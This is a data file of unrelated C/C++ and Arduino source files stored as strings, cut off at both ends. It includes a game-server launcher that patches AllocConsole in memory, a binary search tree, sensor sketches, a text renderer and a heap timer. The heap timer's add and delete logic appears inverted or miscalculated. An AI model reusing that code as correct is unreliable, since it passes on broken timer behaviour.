env));\n\t\treturn copy;\n\t}\n\tdefault:\n\t\treturn ast->dup();\n\t}\n}\n",
    "#define WIN32_LEAN_AND_MEAN\n#include <Windows.h>\n#include <cstdlib>\n#include <cstring>\n#include <cstdio>\n#include \"patches.h\"\n\nstatic constexpr unsigned char s_AllocConsoleShortCircuit[] =\n{\n    0x33, 0xc0, // XOR EAX, EAX\n    0x40,       // INC EAX\n    0xc3,       // RET\n};\n\nchar msg[] = \"We do not support vgui SRCDS and you shouldn't want that anyway if you're doing stuff properly.\\nPlease launch with -console\";\n\nint main(int argc, char* argv[])\n{\n    // get back to where we would be if we were WinMain:\n    HINSTANCE hInstance = GetModuleHandleA(NULL);\n    HINSTANCE hPrevInstance = 0;\n    LPSTR pCmdLine = GetCommandLineA();\n    INT nCmdShow = 0;\n\n    // dedicated.dll calls AllocConsole - we need to short-circuit it as we already have a console.\n    DWORD dwOldProtect = 0;\n    VirtualProtect((void*)&AllocConsole, sizeof(s_AllocConsoleShortCircuit), PAGE_EXECUTE_READWRITE, &dwOldProtect);\n    memmove((void*)&AllocConsole, s_AllocConsoleShortCircuit, sizeof(s_AllocConsoleShortCircuit));\n    VirtualProtect((void*)&AllocConsole, sizeof(s_AllocConsoleShortCircuit), dwOldProtect, &dwOldProtect);\n    FlushInstructionCache(GetCurrentProcess(), &AllocConsole, sizeof(s_AllocConsoleShortCircuit));\n\n    // and now back to our regularly scheduled srcds.exe\n    char* pszOriginalPath = NULL;\n    size_t nOriginalPathLength = 0;\n    _dupenv_s(&pszOriginalPath, &nOriginalPathLength, \"PATH\");\n\n    char szModuleFileName[MAX_PATH];\n    if (!GetModuleFileNameA(hInstance, szModuleFileName, sizeof(szModuleFileName)))\n    {\n        MessageBoxA(NULL, \"Failed calling GetModuleFileName\", \"Launcher Error\", 0);\n        return 0;\n    }\n\n    if (!strstr(GetCommandLine(), \"-console\")) {\n        MessageBox(NULL, msg, \"Bad Boy.\", 0);\n        ExitProcess(1);\n    }\n\n    char* pLastSlash = strrchr(szModuleFileName, '\\\\');\n\n    char szWorkingDirectory[MAX_PATH];\n    strncpy_s(szWorkingDirectory, szModuleFileName, pLastSlash - szModuleFileName);\n\n    char szPath[0x8000];\n    sprintf_s(szPath, \"%s\\\\bin\\\\;%s\", szWorkingDirectory, pszOriginalPath);\n    free(pszOriginalPath);\n    SetEnvironmentVariableA(\"PATH\", szPath);\n    PatchesInit();\n    sprintf_s(szPath, \"%s\\\\bin\\\\dedicated.dll\", szWorkingDirectory);\n\n    HMODULE hModule = LoadLibraryExA(szPath, NULL, LOAD_WITH_ALTERED_SEARCH_PATH);\n    if (!hModule)\n    {\n        char* pszErrorMessage = NULL;\n        FormatMessageA(\n            FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_IGNORE_INSERTS | FORMAT_MESSAGE_FROM_SYSTEM,\n            NULL,\n            GetLastError(),\n            LANG_NEUTRAL,\n            (LPSTR)&pszErrorMessage,\n            0,\n            NULL\n        );\n        char szError[0x400];\n        sprintf_s(szError, \"Failed to load the launcher DLL:\\n\\n%s\", pszErrorMessage);\n        MessageBoxA(NULL, szError, \"Launcher Error\", 0);\n        LocalFree(pszErrorMessage);\n        return 0;\n    }\n\n    typedef int (*MainFunc)(_In_ HINSTANCE, _In_opt_ HINSTANCE hPrevInstance, _In_ LPSTR pCmdLine, _In_ int nCmdShow);\n    MainFunc pDedicatedMain = (MainFunc)GetProcAddress(hModule, \"DedicatedMain\");\n    return (*pDedicatedMain)(hInstance, hPrevInstance, pCmdLine, nCmdShow);\n}\n",
    "#include \"AbstractTopic.h\"\n\n#include <algorithm>\n#include <mutex>\n\n#include \"AbstractSubscriber.h\"\n\nnamespace DogBreeds {\nnamespace JackRussell {\nAbstractTopic::AbstractTopic(std::string topic_name) { m_name = topic_name; }\n\nconst std::string& AbstractTopic::getName() const { return m_name; }\n\nResultCode AbstractTopic::addSubscriber(\n    std::shared_ptr<AbstractSubscriber> sub) {\n  std::lock_guard<std::mutex> lock(m_subscriberListMutex);\n  if (std::find(m_subscriberList.begin(), m_subscriberList.end(), sub) !=\n      m_subscriberList.end()) {\n    return ResultCode::SUBSCRIBER_IS_ALREADY_SUBSCRIBED_TO_TOPIC;\n  }\n  m_subscriberList.push_back(sub);\n  return ResultCode::OK;\n}\n\nResultCode AbstractTopic::removeSubscriber(\n    std::shared_ptr<AbstractSubscriber> sub) {\n  std::lock_guard<std::mutex> lock(m_subscriberListMutex);\n  auto subscriberIt =\n      std::find(m_subscriberList.begin(), m_subscriberList.end(), sub);\n  if (subscriberIt == m_subscriberList.end()) {\n    return ResultCode::SUBSCRIBER_NOT_FOUND_IN_TOPIC;\n  }\n  m_subscriberList.erase(subscriberIt);\n  return ResultCode::OK;\n}\n}  // namespace JackRussell\n}  // namespace DogBreeds",
    "#include <string>\n#include <iostream>\n#include \"BST_song.h\"\n\nusing namespace std;\n\nBST_song::BST_song(){\n\troot = nullptr;\n}\n\nvoid BST_song::destroy(NodeBST *node){\n\tif (node != nullptr){\n\t\tdestroy(node->left);\n\t\tdestroy(node->right);\n\t\tdelete node->data;\n\t\tdelete node;\n\t}\n}\n\nBST_song::~BST_song(){\n\tdestroy(root);\n}\n\nbool BST_song::insert(Song &value){\n\tNodeBST *new_node = new NodeBST();\n\tnew_node->data = &value;\n\tif (root == nullptr){\n\t\troot = new_node;\n\t}\n\telse{\n\t\tNodeBST *current = root;\n\t\twhile (current != nullptr){\n\t\t\tif (value.getSongID() < current->data->getSongID()){\n\t\t\t\tif (current->left == nullptr){\n\t\t\t\t\tcurrent->left = new_node;\n\t\t\t\t\tcurrent = nullptr;\n\t\t\t\t}\n\t\t\t\telse{\n\t\t\t\t\tcurrent = current->left;\n\t\t\t\t}\n\t\t\t}\n\t\t\telse{\n\t\t\t\tif (current->right == nullptr){\n\t\t\t\t\tcurrent->right = new_node;\n\t\t\t\t\tcurrent = nullptr;\n\t\t\t\t}\n\t\t\t\telse{\n\t\t\t\t\tcurrent = current->right;\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t}\n\treturn true;\n}\n\nvoid BST_song::remove(Song &value){\n\tNodeBST *parent = nullptr;\n\tNodeBST *current = root; \n\twhile(current != nullptr){\n\t\tif(current->data->getSongID() == value.getSongID()){\n\t\t\tif(current->left == nullptr && current->right == nullptr){ //remove leaf\n\t\t\t\tif(parent == nullptr){\n\t\t\t\t\troot = nullptr;\n\t\t\t\t}\n\t\t\t\telse if(parent->left == current){\n\t\t\t\t\tparent->left = nullptr;\n\t\t\t\t} \n\t\t\t\telse{\n\t\t\t\t\tparent->right = nullptr;\n\t\t\t\t}\n\t\t\t\tdelete current;\n\t\t\t}\n\t\t\telse if(current->right == nullptr){ // remove if only one left child\n\t\t\t\tif(parent == nullptr){\n\t\t\t\t\troot = current->left;\n\t\t\t\t}\n\t\t\t\telse if(parent->left == current){\n\t\t\t\t\tparent->left = current->left;\n\t\t\t\t}\n\t\t\t\telse{\n\t\t\t\t\tparent->right = current->left;\n\t\t\t\t}\n\t\t\t\tdelete current;\n\t\t\t}\n\t\t\telse{ // remove node with two children\n\t\t\t\tNodeBST *succesor = current->right;\n\t\t\t\tNodeBST *succesorParent = current;\n\t\t\t\twhile(succesor->left != nullptr){\n\t\t\t\t\tsuccesorParent = succesor;\n\t\t\t\t\tsuccesor = succesor->left;\n\t\t\t\t}\n\t\t\t\tSong *succesorData = succesor->data;\n\t\t\t\tif(succesorParent != current){\n\t\t\t\t\tif(succesor->right != nullptr){\n\t\t\t\t\t\tsuccesorParent->left = succesor->right;\n\t\t\t\t\t} else {\n\t\t\t\t\t\tsuccesorParent->left = nullptr;\n\t\t\t\t\t}\n\t\t\t\t} else {\n\t\t\t\t\tif(succesor->right != nullptr){\n\t\t\t\t\t\tsuccesorParent->right = succesor->right;\n\t\t\t\t\t} else {\n\t\t\t\t\t\tsuccesorParent->right = nullptr;\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\tdelete succesor;\n\t\t\t\tcurrent->data = succesorData;\n\t\t\t}\n\t\t\treturn;\n\t\t}\n\t\telse if(value.getSongID() < current->data->getSongID()){\n\t\t\tparent = current;\n\t\t\tcurrent = current->left;\n\t\t}\n\t\telse{\n\t\t\tparent = current;\n\t\t\tcurrent = current->right;\n\t\t}\n\t}\n}\n\nbool BST_song::isEmpty(){\n\treturn root == nullptr;\n}\n\nbool BST_song::search(Song &value){\n\tNodeBST *current = root;\n\twhile (current != nullptr){\n\t\tif (current->data->getSongID() == value.getSongID()){\n\t\t\treturn true;\n\t\t}\n\t\telse if (value.getSongID() < current->data->getSongID()){\n\t\t\tcurrent = current->left;\n\t\t}\n\t\telse{\n\t\t\tcurrent = current->right;\n\t\t}\n\t}\n\treturn false;\n}\n\nvoid BST_song::printInOrder(NodeBST *node){   \n\tif(root != nullptr)\n\t{\n\t\tif (node != nullptr)\n\t\t{\n\t\t\tprintInOrder(node->left);\n\t\t\tif(node->data->getRemovedStat() == false) // only print out if the song hasnt been removed \n\t\t\t{\n\t\t\t\tcout << endl << node->data->getSongID() << \" \" << node->data->getSongTitle() << \" has been listened to for \" << node->data->getSongDuration() << \" seconds\" << endl;\n\t\t\t}\n\t\t\tprintInOrder(node->right);\n\t\t}\n\t}\n\telse\n\t{\n\t\tcout << endl << \"Your song list is empty\" << endl;\n\t}\n}\n\nBST_song::NodeBST *BST_song::getRoot(){\n\treturn root;\n}",
    "#include \"link.h\"\r\n\r\n//#define SERIAL_DEBUG\r\n\r\nstruct MyLink *init_link(){\r\n#ifdef SERIAL_DEBUG\r\n    Serial.println(\"init_link\");\r\n#endif\r\n    struct MyLink *p = (struct MyLink *)malloc(sizeof(struct MyLink));\r\n    p->next = NULL;\r\n    p->anchor_addr = 0;\r\n    p->range[0] = 0.0;\r\n    p->range[1] = 0.0;\r\n    p->range[2] = 0.0;\r\n\r\n    return p;\r\n}\r\n\r\nvoid add_link(struct MyLink *p, uint16_t addr){\r\n#ifdef SERIAL_DEBUG\r\n    Serial.println(\"add_link\");\r\n#endif\r\n    struct MyLink *temp = p;\r\n    //Find struct MyLink end\r\n    while (temp->next != NULL)\r\n    {\r\n        temp = temp->next;\r\n    }\r\n\r\n    Serial.println(\"add_link:find struct MyLink end\");\r\n    //Create a anchor\r\n    struct MyLink *a = (struct MyLink *)malloc(sizeof(struct MyLink));\r\n    a->anchor_addr = addr;\r\n    a->range[0] = 0.0;\r\n    a->range[1] = 0.0;\r\n    a->range[2] = 0.0;\r\n    a->dbm = 0.0;\r\n    a->next = NULL;\r\n\r\n    //Add anchor to end of struct MyLink\r\n    temp->next = a;\r\n\r\n    return;\r\n}\r\n\r\nstruct MyLink *find_link(struct MyLink *p, uint16_t addr){\r\n#ifdef SERIAL_DEBUG\r\n    Serial.println(\"find_link\");\r\n#endif\r\n    if (addr == 0)\r\n    {\r\n        Serial.println(\"find_link:Input addr is 0\");\r\n        return NULL;\r\n    }\r\n\r\n    if (p->next == NULL)\r\n    {\r\n        Serial.println(\"find_link:Link is empty\");\r\n        return NULL;\r\n    }\r\n\r\n    struct MyLink *temp = p;\r\n    //Find target struct MyLink or struct MyLink end\r\n    while (temp->next != NULL)\r\n    {\r\n        temp = temp->next;\r\n        if (temp->anchor_addr == addr)\r\n        {\r\n            // Serial.println(\"find_link:Find addr\");\r\n            return temp;\r\n        }\r\n    }\r\n\r\n    Serial.println(\"find_link:Can't find addr\");\r\n    return NULL;\r\n}\r\n\r\nbool isLinkEmpty(struct MyLink *p){\r\n  if (p->next == NULL)\r\n    {\r\n        Serial.println(\"find_link:Link is empty\");\r\n        return true;\r\n    }\r\n    return false;\r\n}\r\n\r\nvoid fresh_link(struct MyLink *p, uint16_t addr, float range, float dbm){\r\n#ifdef SERIAL_DEBUG\r\n    Serial.println(\"fresh_link\");\r\n#endif\r\n    struct MyLink *temp = find_link(p, addr);\r\n    if (temp != NULL)\r\n    {\r\n        temp->range[2] = temp->range[1];\r\n        temp->range[1] = temp->range[0];\r\n\r\n        temp->range[0] = (range + temp->range[1] + temp->range[2]) / 3;\r\n        temp->dbm = dbm;\r\n        return;\r\n    }\r\n    else\r\n    {\r\n        Serial.println(\"fresh_link:Fresh fail\");\r\n        return;\r\n    }\r\n}\r\n\r\nvoid print_link(struct MyLink *p){\r\n#ifdef SERIAL_DEBUG\r\n    Serial.println(\"print_link\");\r\n#endif\r\n    struct MyLink *temp = p;\r\n\r\n    while (temp->next != NULL)\r\n    {\r\n        //Serial.println(\"Dev %d:%d m\", temp->next->anchor_addr, temp->next->range);\r\n        Serial.println(temp->next->anchor_addr, HEX);\r\n        Serial.println(temp->next->range[0]);\r\n        Serial.println(temp->next->dbm);\r\n        temp = temp->next;\r\n    }\r\n\r\n    return;\r\n}\r\n\r\nvoid delete_link(struct MyLink *p, uint16_t addr){\r\n#ifdef SERIAL_DEBUG\r\n    Serial.println(\"delete_link\");\r\n#endif\r\n    if (addr == 0)\r\n        return;\r\n\r\n    struct MyLink *temp = p;\r\n    while (temp->next != NULL)\r\n    {\r\n        if (temp->next->anchor_addr == addr)\r\n        {\r\n            struct MyLink *del = temp->next;\r\n            temp->next = del->next;\r\n            free(del);\r\n            return;\r\n        }\r\n        temp = temp->next;\r\n    }\r\n    return;\r\n}\r\n\r\nvoid make_link_json(struct MyLink *p, String *s){\r\n#ifdef SERIAL_DEBUG\r\n    Serial.println(\"make_link_json\");\r\n#endif\r\n    *s = \"{\\\"links\\\":[\";\r\n    struct MyLink *temp = p;\r\n\r\n    while (temp->next != NULL)\r\n    {\r\n        temp = temp->next;\r\n        char link_json[50];\r\n        sprintf(link_json, \"{\\\"A\\\":\\\"%X\\\",\\\"R\\\":\\\"%.1f\\\"}\", temp->anchor_addr, temp->range[0]);\r\n        *s += link_json;\r\n        if (temp->next != NULL)\r\n        {\r\n            *s += \",\";\r\n        }\r\n    }\r\n    *s += \"]}\";\r\n    Serial.println(*s);\r\n}\r\n\r\nvoid make_link_http_post(struct MyLink *p, struct UWB_ANCHOR *p2){\r\n  struct MyLink *temp = p;\r\n  struct UWB_ANCHOR *uwb_anchor = p2;\r\n\r\n  uwb_anchor->Anchor_0 = 0.0;\r\n  uwb_anchor->Anchor_1 = 0.0;\r\n  uwb_anchor->Anchor_2 = 0.0;\r\n  uwb_anchor->Anchor_3 = 0.0;\r\n  uwb_anchor->Anchor_4 = 0.0;\r\n  uwb_anchor->Anchor_5 = 0.0;\r\n  uwb_anchor->Anchor_6 = 0.0;\r\n  uwb_anchor->Anchor_7 = 0.0;\r\n  \r\n  while(temp->next != NULL){\r\n    temp = temp->next;\r\n\r\n    if(temp->anchor_addr == uwb_anchor->ANCHOR_DEC_ADDR[0])\r\n      uwb_anchor->Anchor_0 = temp->range[0];\r\n    else if(temp->anchor_addr == uwb_anchor->ANCHOR_DEC_ADDR[1])\r\n      uwb_anchor->Anchor_1 = temp->range[0];\r\n    else if(temp->anchor_addr == uwb_anchor->ANCHOR_DEC_ADDR[2])\r\n      uwb_anchor->Anchor_2 = temp->range[0];\r\n    else if(temp->anchor_addr == uwb_anchor->ANCHOR_DEC_ADDR[3])\r\n      uwb_anchor->Anchor_3 = temp->range[0];\r\n    else if(temp->anchor_addr == uwb_anchor->ANCHOR_DEC_ADDR[4])\r\n      uwb_anchor->Anchor_4 = temp->range[0];\r\n    else if(temp->anchor_addr == uwb_anchor->ANCHOR_DEC_ADDR[5])\r\n      uwb_anchor->Anchor_5 = temp->range[0];\r\n    else if(temp->anchor_addr == u",
    "#include \"heap_timer.hpp\"\n#include <cassert>\n#include <chrono>\n#include <cstddef>\n#include <utility>\nvoid HeapTimer::adjust(int id, int newExpires){\n    assert(!heap_.empty()&&ref_.count(id));\n    heap_[ref_[id]].expires = Clock::now()+Ms(newExpires);\n    shift_down_(ref_[id],heap_.size());\n}\nvoid HeapTimer::add(int id,int time_out,const timeoutCallBack& call_bakc){\n    assert(id>0);\n    size_t i;\n    if(ref_.count(id)){\n        i = heap_.size();\n        ref_[id] = i;\n        heap_.push_back(timer{id,Clock::now()+Ms(time_out),call_bakc});\n    }\n    else{\n        i = ref_[id];\n        heap_[i].expires = Clock::now()+Ms(time_out);\n        if(shift_down_(i, heap_.size())){\n            shift_up_(i);\n        }\n    }\n}\nvoid HeapTimer::doWork(int id){\n    if (heap_.empty()||!ref_.count(id)){\n        return;\n    }\n    size_t i = ref_[id];\n    auto timer = heap_[i];\n    timer.call_back();\n    del_(id);\n}\nvoid HeapTimer::clear(){\n    heap_.clear();\n    ref_.clear();\n}\nvoid HeapTimer::pop(){\n    assert(!heap_.empty());\n    del_(0);\n}\nvoid HeapTimer::tick(){\n    if(heap_.empty()){\n        return;\n    }\n    while(!heap_.empty()){\n        auto timer = heap_.front();\n        if(std::chrono::duration_cast<Ms>(timer.expires-Clock::now()).count()>0){\n            break;\n        }\n        timer.call_back();\n        pop();\n    }\n}\nint HeapTimer::GetNextTick(){\n    tick();\n    size_t res = -1;\n    if(!heap_.empty()){\n        res = std::chrono::duration_cast<Ms>(heap_.front().expires-Clock::now()).count();\n        if(res < 0){\n            res = 0;\n        }\n    }\n    return res;\n}\nvoid HeapTimer::del_(size_t index){\n    assert(!heap_.empty()&&index>=0&&index<heap_.size());\n    size_t i = index;\n    size_t n = heap_.size() - i;\n    assert(i<=n);\n    if (i<n){\n        swap_node_(i, n);\n        if(!shift_down_(i, n)){\n            shift_up_(i);\n        }\n    }\n    ref_.erase(heap_.back().id);\n    heap_.pop_back();\n}\nvoid HeapTimer::shift_up_(size_t i){\n    assert(i>0&&i<heap_.size());\n    size_t j  = (i-1)/2;\n    while(j>=0){\n        if(heap_[j]<heap_[i]){\n            break;\n        }\n        swap_node_(i,j);\n        i = j;\n        j = (i-1)/2;\n    }\n}\nbool HeapTimer::shift_down_(size_t index,size_t n){\n    assert(index>0&&index<heap_.size());\n    assert(n>0&&n<heap_.size());\n    size_t i = index;\n    size_t j = i*2+1;\n    while (j<n) {\n        if(j+1<n&&heap_[j+1]<heap_[j]){\n            j++;\n        }\n        swap_node_(i, j);\n        i = j;\n        j = i * 2 +1;\n    }\n    return i>index;\n}\nvoid HeapTimer::swap_node_(size_t i,size_t j){\n    assert(i>0&&i<heap_.size());\n    assert(j>0&&j<heap_.size());\n    std::swap(heap_[i],heap_[j]);\n    ref_[heap_[i].id] = i;\n    ref_[heap_[j].id] = j;   \n\n}",
    "#include \"Text_Render.h\"\nextern unsigned int TVAO, TVBO;\n\nvoid Text::RenderText(Shader& shader, std::string text, float x, float y, float scale, glm::vec3 color)\n{\n\tscale = scale * 48.0f / 256.0f;\n\tfloat copyX = x;\n\t// activate corresponding render state\t\n\tshader.use();\n\tglUniform3f(glGetUniformLocation(shader.ID, \"textColor\"), color.x, color.y, color.z);\n\tglActiveTexture(GL_TEXTURE0);\n\tglBindTexture(GL_TEXTURE_2D_ARRAY, textureArray);\n\tglBindVertexArray(TVAO);\n\t//glBindBuffer(GL_ARRAY_BUFFER, TVBO);\n\n\tint workingIndex = 0;\n\t// iterate through all characters\n\tstd::string::const_iterator c;\n\tfor (c = text.begin(); c != text.end(); c++)\n\t{\n\n\t\tCharacter ch = Characters[*c];\n\n\t\tif (*c == '\\n') {\n\t\t\ty -= ((ch.Size.y)) * 1.3 * scale;\n\t\t\tx = copyX;\n\t\t}\n\t\telse if (*c == ' ') {\n\t\t\tx += (ch.Advance >> 6) * scale;\n\t\t}\n\t\telse\n\t\t{\n\t\t\tfloat xpos = x + ch.Bearing.x * scale;\n\t\t\tfloat ypos = y - (256 - ch.Bearing.y) * scale;\n\n\t\t\tT[workingIndex] = glm::translate(glm::mat4(1.0f), glm::vec3(xpos, ypos, 0)) * glm::scale(glm::mat4(1.0f), glm::vec3(256 * scale, 256 * scale, 0));\n\t\t\tletterMap[workingIndex] = ch.TextureID;\n\n\t\t\t// now advance cursors for next glyph (note that advance is number of 1/64 pixels)\n\t\t\tx += (ch.Advance >> 6) * scale; // bitshift by 6 to get value in pixels (2^6 = 64 (divide amount of 1/64th pixels by 64 to get amount of pixels))\n\t\t\tworkingIndex++;\n\t\t\tif (workingIndex == ARRAY_LIMIT - 1) {\n\t\t\t\tTextRenderCall(workingIndex, shader.ID);\n\t\t\t\tworkingIndex = 0;\n\t\t\t}\n\t\t}\n\n\n\t}\n\tTextRenderCall(workingIndex, shader.ID);\n\n\tglBindBuffer(GL_ARRAY_BUFFER, 0);\n\tglBindVertexArray(0);\n\tglBindTexture(GL_TEXTURE_2D_ARRAY, 0);\n\n}\n\nvoid Text::TextRenderCall(int length, GLuint shader)\n{\n\tif (length != 0) {\n\t\tglUniformMatrix4fv(glGetUniformLocation(shader, \"transforms\"), length, GL_FALSE, &T[0][0][0]);\n\t\tglUniform1iv(glGetUniformLocation(shader, \"letterMap\"), length, &letterMap[0]);\n\t\tglDrawArraysInstanced(GL_TRIANGLE_STRIP, 0, 4, length);\n\t}\n\n}\n\nvoid Text::init()\n{\n\tFT_Library ft;\n\t// All functions return a value different than 0 whenever an error occurred\n\tif (FT_Init_FreeType(&ft))\n\t{\n\t\tstd::cout << \"ERROR::FREETYPE: Could not init FreeType Library\" << std::endl;\n\t\treturn;\n\t}\n\n\t// find path to font\n\tstd::string font_name = std::string(\"res/Fonts/PressStart2P-Regular.ttf\");\n\tif (font_name.empty())\n\t{\n\t\tstd::cout << \"ERROR::FREETYPE: Failed to load font_name\" << std::endl;\n\t\treturn;\n\t}\n\n\t// load font as face\n\tFT_Face face;\n\tif (FT_New_Face(ft, font_name.c_str(), 0, &face)) {\n\t\tstd::cout << \"ERROR::FREETYPE: Failed to load font\" << std::endl;\n\t\treturn;\n\t}\n\telse {\n\t\t// set size to load glyphs as\n\t\tFT_Set_Pixel_Sizes(face, 256, 256);\n\n\t\t// disable byte-alignment restriction\n\t\tglPixelStorei(GL_UNPACK_ALIGNMENT, 1);\n\n\t\tglGenTextures(1, &textureArray);\n\t\tglActiveTexture(GL_TEXTURE0);\n\t\tglBindTexture(GL_TEXTURE_2D_ARRAY, textureArray);\n\t\tglTexImage3D(GL_TEXTURE_2D_ARRAY, 0, GL_R8, 256, 256, 128, 0, GL_RED, GL_UNSIGNED_BYTE, 0);\n\n\t\t// load first 128 characters of ASCII set\n\t\tfor (unsigned char c = 0; c < 128; c++)\n\t\t{\n\t\t\t// Load character glyph \n\t\t\tif (FT_Load_Char(face, c, FT_LOAD_RENDER))\n\t\t\t{\n\t\t\t\tstd::cout << \"ERROR::FREETYTPE: Failed to load Glyph\" << std::endl;\n\t\t\t\tcontinue;\n\t\t\t}\n\t\t\tglTexSubImage3D(\n\t\t\t\tGL_TEXTURE_2D_ARRAY,\n\t\t\t\t0, 0, 0, int(c),\n\t\t\t\tface->glyph->bitmap.width,\n\t\t\t\tface->glyph->bitmap.rows, 1,\n\t\t\t\tGL_RED,\n\t\t\t\tGL_UNSIGNED_BYTE,\n\t\t\t\tface->glyph->bitmap.buffer\n\t\t\t);\n\t\t\t// set texture options\n\t\t\tglTexParameteri(GL_TEXTURE_2D_ARRAY, GL_TEXTURE_WRAP_S, GL_CLAMP_TO_EDGE);\n\t\t\tglTexParameteri(GL_TEXTURE_2D_ARRAY, GL_TEXTURE_WRAP_T, GL_CLAMP_TO_EDGE);\n\t\t\tglTexParameteri(GL_TEXTURE_2D_ARRAY, GL_TEXTURE_MIN_FILTER, GL_LINEAR);\n\t\t\tglTexParameteri(GL_TEXTURE_2D_ARRAY, GL_TEXTURE_MAG_FILTER, GL_LINEAR);\n\t\t\t// now store character for later use\n\t\t\tCharacter character = {\n\t\t\t\tint(c),\n\t\t\t\tglm::ivec2(face->glyph->bitmap.width, face->glyph->bitmap.rows),\n\t\t\t\tglm::ivec2(face->glyph->bitmap_left, face->glyph->bitmap_top),\n\t\t\t\tstatic_cast<unsigned int>(face->glyph->advance.x)\n\t\t\t};\n\t\t\tCharacters.insert(std::pair<char, Character>(c, character));\n\t\t}\n\t\tglBindTexture(GL_TEXTURE_2D_ARRAY, 0);\n\t}\n\t// destroy FreeType once we're finished\n\tFT_Done_Face(face);\n\tFT_Done_FreeType(ft);\n}\n",
    "#include <Arduino.h>\n\n// PARAMETROS\nint MAX = 2971;// MAX 2971  0 % MOLHADO\nint MIN = 1000;// MIN 1000 100% MOLHADO\n\n//PINOS\n#define SENSOR 35\n#define RED 5\n#define YELLOW 18\n#define GREEN 19\n#define LED_PIN 2\n\n\nvoid setup() {\n  Serial.begin(115200);\n  pinMode(SENSOR, INPUT);\n  pinMode(RED, OUTPUT);\n  pinMode(YELLOW, OUTPUT);\n  pinMode(GREEN, OUTPUT);\n  pinMode(LED_PIN, OUTPUT);\n}\n\nvoid loop() {\n  int leitura = analogRead(SENSOR);\n  int percentage = map(leitura, MIN, MAX, 100, 0);\n  Serial.println(percentage);\n  digitalWrite(LED_PIN, HIGH);\n  delay(50);\n  digitalWrite(LED_PIN, LOW);\n    if (percentage < 60) {\n    Serial.println(\"RED\");\n    digitalWrite(RED, HIGH);\n    digitalWrite(YELLOW, LOW);\n    digitalWrite(GREEN, LOW);\n  } else if (percentage >= 70 && percentage < 80) {\n    Serial.println(\"YELLOW\");\n    digitalWrite(RED, LOW);\n    digitalWrite(YELLOW, HIGH);\n    digitalWrite(GREEN, LOW);\n  } else {\n    Serial.println(\"GREEN\");\n    digitalWrite(RED, LOW);\n    digitalWrite(YELLOW, LOW);\n    digitalWrite(GREEN, HIGH);\n  }\n  delay(5*60*1000);\n}\n\n",
    "#include <iostream>\n#include <cctype>\n\n#include \"Utility.h\"\n\nchar Utility::GetCharacter(const std::string& prompt, const std::string& error)\n{\n\tconst int IGNORE_CHARS = 256;\n\n\tchar input;\n\tbool failure;\n\n\tdo\n\t{\n\t\tfailure = false;\n\n\t\tstd::cout << prompt;\n\t\tstd::cin >> input;\n\n\t\tif (std::cin.fail())\n\t\t{\n\t\t\tstd::cin.clear();\n\t\t\tstd::cin.ignore(IGNORE_CHARS, '\\n');\n\t\t\tstd::cout << error << std::endl;\n\t\t\tfailure = true;\n\t\t}\n\t\telse\n\t\t{\n\t\t\tstd::cin.ignore(IGNORE_CHARS, '\\n');\n\n\t\t\tif (std::isalpha(input))\n\t\t\t\tinput = std::tolower(input);\n\t\t\telse\n\t\t\t{\n\t\t\t\tstd::cout << error << std::endl;\n\t\t\t\tfailure = true;\n\t\t\t}\n\t\t}\n\t}\n\twhile (failure);\n\n\treturn input;\n}\n\nchar Utility::GetCharacter(const std::string& prompt, const std::string& error, const char validInput[], int validInputLength, CharacterCaseType charCase)\n{\n\tconst int IGNORE_CHARS = 256;\n\n\tchar input;\n\tbool failure;\n\n\tdo\n\t{\n\t\tfailure = false;\n\n\t\tstd::cout << prompt;\n\t\tstd::cin >> input;\n\n\t\tif (std::cin.fail())\n\t\t{\n\t\t\tstd::cin.clear();\n\t\t\tstd::cin.ignore(IGNORE_CHARS, '\\n');\n\t\t\tstd::cout << error << std::endl;\n\t\t\tfailure = true;\n\t\t}\n\t\telse\n\t\t{\n\t\t\tstd::cin.ignore(IGNORE_CHARS, '\\n');\n\n\t\t\tif (std::isalpha(input))\n\t\t\t{\n\t\t\t\tif (charCase == CharacterCaseType::UpperCase)\n\t\t\t\t\tinput = std::toupper(input);\n\t\t\t\telse if (charCase == CharacterCaseType::LowerCase)\n\t\t\t\t\tinput = std::tolower(input);\n\n\t\t\t\tfor (int i = 0; i < validInputLength; i++)\n\t\t\t\t{\n\t\t\t\t\tif (input == validInput[i])\n\t\t\t\t\t\treturn input;\n\t\t\t\t}\n\t\t\t}\n\n\t\t\tstd::cout << error << std::endl;\n\t\t\tfailure = true;\n\t\t}\n\n\t}\n\twhile (failure);\n\n\treturn input;\n}\n\nint Utility::GetInteger(const std::string& prompt, const std::string& error, const int validInput[], int validInputLength)\n{\n\tint input;\n\tbool inputFailure;\n\n\tconst int IGNORE_CHARS = 256;\n\tdo\n\t{\n\t\tinputFailure = false;\n\n\t\tstd::cout << prompt;\n\t\tstd::cin >> input;\n\n\t\tif (std::cin.fail())\n\t\t{\n\t\t\tstd::cin.clear();\n\t\t\tstd::cin.ignore(IGNORE_CHARS, '\\n');\n\t\t\tstd::cout << error << std::endl;\n\t\t\tinputFailure = true;\n\t\t}\n\t\telse\n\t\t{\n\t\t\tfor (int i = 0; i < validInputLength; i++)\n\t\t\t{\n\t\t\t\tif (input == validInput[i])\n\t\t\t\t\treturn input;\n\t\t\t}\n\n\t\t\tstd::cout << error << std::endl;\n\t\t\tinputFailure = true;\n\t\t}\n\t}\n\twhile (inputFailure);\n\n\treturn -1;\n}\n\nvoid Utility::ClearScreen()\n{\n\tsystem(\"cls\");\n}\n\nvoid Utility::WaitForKeyPress()\n{\n\tsystem(\"pause -n 1 -s -p \\\"Press any key to continue...\\\";echo\");\n}\n",
    "#include <cstdio>\n#include <cassert>\n#include <cstdint>\n#include <chrono>\n#include <cstring>\n#include <string_view>\n\n#include <curl/curl.h>\n#include <json-c/json.h>\n\n#include <sqlite3ext.h> /* Do not use <sqlite3.h>! */\nSQLITE_EXTENSION_INIT1\n\nbool isValidHexChar(char c) {\n    return ((c >= '0' && c <= '9') || (c >= 'a' && c <= 'f') || (c >= 'A' && c <= 'F'));\n}\n\nstd::optional<std::string> normalize_uuid(std::string_view uuid) {\n    std::string out;\n    out.reserve(36);\n    int hyphens = 0;\n    int hex_chars = 0;\n    for (char c : uuid) {\n        if (c == '-') {\n            hyphens++;\n            if (hyphens > 4) return {}; // Too many hyphens\n        }\n        else if (isValidHexChar(c)) {\n            hex_chars++;\n            if (hex_chars > 32) return {}; // Too many hex chars\n            out.push_back(tolower(c));\n            if (hex_chars == 8 || hex_chars == 12 || hex_chars == 16 || hex_chars == 20) {\n                out.push_back('-');\n            }\n        } else {\n            return {}; // 